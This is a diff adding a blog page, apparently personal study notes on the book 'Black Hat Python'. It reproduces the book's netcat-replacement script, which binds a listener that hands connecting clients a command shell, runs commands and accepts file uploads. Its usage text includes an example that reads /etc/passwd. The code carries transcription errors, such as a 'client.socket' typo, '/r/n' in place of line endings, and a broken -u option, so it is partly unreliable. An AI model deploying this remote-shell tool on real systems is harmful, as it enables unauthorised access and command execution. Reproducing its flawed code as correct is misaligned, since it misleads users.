@@ -1,0 +1,228 @@
+
+
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>BlackHat Python(1) | XEI7 乱M集</title>
+  <meta name="author" content="XEI7">
+  
+  <meta name="description" content="BlackHat Python">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="BlackHat Python(1)"/>
+  <meta property="og:site_name" content="XEI7 乱M集"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/imgs/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="XEI7 乱M集" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+
+<body>
+  <header><div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/imgs/logo.png" alt="XEI7 乱M集" title="XEI7 乱M集"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name">XEI7 乱M集</h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/urls">_</a></li>
+					
+
+				</ul>
+			</nav>			
+</div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header class="article-info clearfix">
+  <h1 itemprop="name">
+	BlackHat Python(1)
+  </h1>
+  <p class="article-author">By
+    
+      <a href="https://xei7.github.io" title="XEI7">XEI7</a>
+    </p>
+  <p class="article-time">
+    <time datetime="1912-12-01T00:00:00.000Z" itemprop="datePublished">1912-12-01</time>
+    更新日期:<time datetime="2015-11-30T03:49:09.806Z" itemprop="dateModified">2015-11-30</time>
+    
+  </p>
+</header>
+    <div class="entry">
+		
+        <p>BlackHat Python<br><a id="more"></a></p>
+<h3 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h3><pre><code>Replacing Netcat
+</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2.7</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> getopt</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line"><span class="comment"># declare and initialize global vars</span></div><div class="line">listen = <span class="keyword">False</span></div><div class="line">command = <span class="keyword">False</span></div><div class="line">upload = <span class="keyword">False</span></div><div class="line">execute = <span class="string">""</span></div><div class="line">target = <span class="string">""</span></div><div class="line">upload_destination = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span> <span class="params">()</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"BHP Net Tool"</span></div><div class="line">    <span class="keyword">print</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"Usage: bhpnet.py -t target_host -p port"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"-l --listen              - listen on [host]:[port] for incoming connections"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"-e --execute=file_to_run - execute the given file upon receiving a connection"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"-c --command             - initialize a command shell"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"-u --upload=destination  - upon receiving a connection upload a file and write to [destination]"</span></div><div class="line">    <span class="keyword">print</span></div><div class="line">    <span class="keyword">print</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"Examples: "</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -c"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"</span></div><div class="line">    sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></div><div class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># connect to our target host</span></div><div class="line">        client.connect((target,port))</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> len(buffer):</div><div class="line">            client.send(buffer)</div><div class="line">            </div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="comment"># now wait for data back</span></div><div class="line">            recv_len = <span class="number">1</span></div><div class="line">            response = <span class="string">""</span></div><div class="line">            </div><div class="line">            <span class="keyword">while</span> recv_len:</div><div class="line">                data = client.recv(<span class="number">4096</span>)          </div><div class="line">                recv_len = len(data)</div><div class="line">                response += data</div><div class="line">            </div><div class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:</div><div class="line">                    <span class="keyword">break</span></div><div class="line">            <span class="keyword">print</span> response,</div><div class="line">        </div><div class="line">            <span class="comment"># wait for more input</span></div><div class="line">            buffer = raw_input(<span class="string">""</span>)</div><div class="line">            buffer += <span class="string">"\n"</span></div><div class="line">        </div><div class="line">            <span class="comment"># send it off</span></div><div class="line">            client.send(buffer)</div><div class="line">    </div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"[*] Exception! Exiting."</span></div><div class="line">        </div><div class="line">        <span class="comment"># tear down the connection</span></div><div class="line">        client.close()</div><div class="line">        </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> target</div><div class="line">    <span class="keyword">global</span> port</div><div class="line">    </div><div class="line">    <span class="comment"># if no target is defined, we listen on all interfaces</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</div><div class="line">        target = <span class="string">"0.0.0.0"</span></div><div class="line">    </div><div class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    server.bind((target, port))</div><div class="line">    server.listen(<span class="number">5</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        client_socket, addr = server.accept()</div><div class="line">        </div><div class="line">        <span class="comment"># spin off a new thread to handle the client</span></div><div class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</div><div class="line">        client_thread.start()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></div><div class="line">    <span class="comment"># trim the newline</span></div><div class="line">    command = command.rstrip()</div><div class="line">    </div><div class="line">    <span class="comment"># run the command and get the output back</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        output = <span class="string">"[-] Failed to execute command\r\n"</span></div><div class="line">        </div><div class="line">    <span class="comment"># send the output back to the client</span></div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></div><div class="line">    <span class="keyword">global</span> upload</div><div class="line">    <span class="keyword">global</span> execute</div><div class="line">    <span class="keyword">global</span> command</div><div class="line">    </div><div class="line">    <span class="comment"># check for upload</span></div><div class="line">    <span class="keyword">if</span> len(upload_destination):</div><div class="line">        </div><div class="line">        <span class="comment"># read in all the bytes of the file and write to our destination</span></div><div class="line">        </div><div class="line">        file_buffer = <span class="string">""</span></div><div class="line">        </div><div class="line">        <span class="comment"># keep reading data until none is available</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            data = client_socket.recv(<span class="number">1024</span>)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                file_buffer += data</div><div class="line">        </div><div class="line">        <span class="comment"># now we take these bytes and write them out</span></div><div class="line">        <span class="keyword">try</span>: </div><div class="line">            file_descriptor = open(upload_destination,<span class="string">"wb"</span>)</div><div class="line">            file_descriptor.write(file_buffer)</div><div class="line">            file_descriptor.close()</div><div class="line">            </div><div class="line">            <span class="comment"># acknowledge that we wrote the file out</span></div><div class="line">            client_socket.send(<span class="string">"Successfully saved file to %s/r/n"</span> % upload_destination)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            client_socket.send(<span class="string">"Failed to save file to %s/r/n"</span> % upload_destination)</div><div class="line">            </div><div class="line">    <span class="comment"># check for command execution</span></div><div class="line">    <span class="keyword">if</span> len(execute):</div><div class="line">        </div><div class="line">        <span class="comment"># run the command</span></div><div class="line">        output = run_command(execute)</div><div class="line">        </div><div class="line">        client.socket.send(output)</div><div class="line">        </div><div class="line">    <span class="comment"># now we go into another loop if a command shell was requested</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> command:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="comment"># show a simple prompt</span></div><div class="line">            client_socket.send(<span class="string">"&lt;BHP:#&gt; "</span>)</div><div class="line">            </div><div class="line">            <span class="comment"># now we revieve until we see a linefeed (enter key)</span></div><div class="line">            cmd_buffer = <span class="string">""</span></div><div class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</div><div class="line">                cmd_buffer += client_socket.recv(<span class="number">1024</span>)</div><div class="line">            </div><div class="line">            <span class="comment"># we have a valid command so execute it and send back the results</span></div><div class="line">            response = run_command(cmd_buffer)</div><div class="line">            </div><div class="line">            <span class="comment"># send the response back to the client</span></div><div class="line">            client_socket.send(response)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># needed to modify global copies of variables</span></div><div class="line">    <span class="keyword">global</span> listen</div><div class="line">    <span class="keyword">global</span> port</div><div class="line">    <span class="keyword">global</span> execute</div><div class="line">    <span class="keyword">global</span> command</div><div class="line">    <span class="keyword">global</span> upload_destination</div><div class="line">    <span class="keyword">global</span> target</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(sys.argv[<span class="number">1</span>:]): <span class="comment"># if there is more than one element in the array</span></div><div class="line">        usage()</div><div class="line">    </div><div class="line">    <span class="comment"># read the commandline options    </span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hle:t:p:cu"</span>,[<span class="string">"help"</span>,<span class="string">"listen"</span>,<span class="string">"execute"</span>,<span class="string">"target"</span>,<span class="string">"port"</span>,<span class="string">"command"</span>,<span class="string">"upload"</span>])</div><div class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</div><div class="line">        <span class="keyword">print</span> str(err)</div><div class="line">        usage()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</div><div class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</div><div class="line">            usage()</div><div class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</div><div class="line">            listen = <span class="keyword">True</span></div><div class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</div><div class="line">            execute = a</div><div class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</div><div class="line">            command = <span class="keyword">True</span></div><div class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</div><div class="line">            upload_destination = a</div><div class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</div><div class="line">            target = a</div><div class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</div><div class="line">            port = int(a)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">assert</span> <span class="keyword">False</span>, <span class="string">"Unhandled Option"</span></div><div class="line">            </div><div class="line">    <span class="comment"># are we going to listen or just send data from stdin?</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>:</div><div class="line">            </div><div class="line">        <span class="comment"># read in the buffer from the commandline</span></div><div class="line">        <span class="comment"># this will block, so send CTRL-D if not sending input</span></div><div class="line">        <span class="comment"># to stdin</span></div><div class="line">            </div><div class="line">        buffer = sys.stdin.read()</div><div class="line">            </div><div class="line">        <span class="keyword">print</span> <span class="string">"sending data"</span></div><div class="line">        <span class="comment"># send data off</span></div><div class="line">        client_sender(buffer)</div><div class="line">            </div><div class="line">    <span class="comment"># we are going to listen and potentially </span></div><div class="line">    <span class="comment"># upload things, execute commands, and drop a shell back </span></div><div class="line">    <span class="comment"># depending on our command line options above</span></div><div class="line">    <span class="keyword">if</span> listen:</div><div class="line">        server_loop()</div><div class="line">    </div><div class="line">main()</div></pre></td></tr></table></figure>
+
+    </div>
+    <footer>
+        
+  
+  <div class="categories">
+    <a href="/categories/python/">python</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/python/">python</a>, <a href="/tags/笔记/">笔记</a>
+  </div>
+ 
+        <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+ <nav id="pagination" >
+    
+    <a href="/1912/12/01/XSS之WAF绕过/" class="alignleft prev" title="XSS之WAF绕过">XSS之WAF绕过</a>
+    
+    
+    <a href="/1912/12/01/Books/" class="alignright next" title="Books">Books</a>
+    
+    <div class="clearfix"></div>
+</nav>
+
+
+
+	
+	<section id="comment">
+		<!-- 多说评论框 start -->
+		<div class="ds-thread" data-thread-key="1912/12/01/BlackHat-Python-1/" data-title="BlackHat Python(1)" data-url="https://xei7.github.io/1912/12/01/BlackHat-Python-1/"></div>
+		<!-- 多说评论框 end -->
+		<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+		<script type="text/javascript">
+		var duoshuoQuery = {short_name:"xei7"};
+		(function() {
+			var ds = document.createElement('script');
+			ds.type = 'text/javascript';ds.async = true;
+			ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+			ds.charset = 'UTF-8';
+			(document.getElementsByTagName('head')[0] 
+			 || document.getElementsByTagName('body')[0]).appendChild(ds);
+		})();
+		</script>
+		<!-- 多说公共JS代码 end -->
+	</section>
+	
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/bluetooth/">bluetooth</a><small>2</small></li>
+  
+    <li><a href="/categories/kali/">kali</a><small>3</small></li>
+  
+    <li><a href="/categories/linux/">linux</a><small>2</small></li>
+  
+    <li><a href="/categories/python/">python</a><small>1</small></li>
+  
+    <li><a href="/categories/sdr/">sdr</a><small>1</small></li>
+  
+    <li><a href="/categories/sqlmap/">sqlmap</a><small>3</small></li>
+  
+    <li><a href="/categories/web/">web</a><small>7</small></li>
+  
+    <li><a href="/categories/中医/">中医</a><small>4</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>5</small></li>
+  
+    <li><a href="/categories/网络/">网络</a><small>1</small></li>
+  
+    <li><a href="/categories/逆向/">逆向</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/aircrack/" style="font-size: 10px;">aircrack</a> <a href="/tags/bash/" style="font-size: 10px;">bash</a> <a href="/tags/bluetooth/" style="font-size: 12.5px;">bluetooth</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/elf/" style="font-size: 12.5px;">elf</a> <a href="/tags/kali/" style="font-size: 12.5px;">kali</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/rtl-sdr/" style="font-size: 10px;">rtl-sdr</a> <a href="/tags/sqlmap/" style="font-size: 12.5px;">sqlmap</a> <a href="/tags/sqlmapapi/" style="font-size: 10px;">sqlmapapi</a> <a href="/tags/waf/" style="font-size: 10px;">waf</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/中医/" style="font-size: 15px;">中医</a> <a href="/tags/五行/" style="font-size: 10px;">五行</a> <a href="/tags/养生/" style="font-size: 12.5px;">养生</a> <a href="/tags/审计/" style="font-size: 10px;">审计</a> <a href="/tags/工控/" style="font-size: 10px;">工控</a> <a href="/tags/批量/" style="font-size: 10px;">批量</a> <a href="/tags/易经/" style="font-size: 10px;">易经</a> <a href="/tags/端口/" style="font-size: 10px;">端口</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a> <a href="/tags/绕过/" style="font-size: 10px;">绕过</a> <a href="/tags/重装/" style="font-size: 10px;">重装</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">友情链接</h3>
+<ul class="entry">
+<li><a href="http://blog.sina.com.cn/3838120958 " title=" Blog" target="_blank">_</a></li>
+</ul>
+</div>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<!--script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"-->
+</script>
+</body>
+</html>
+
+
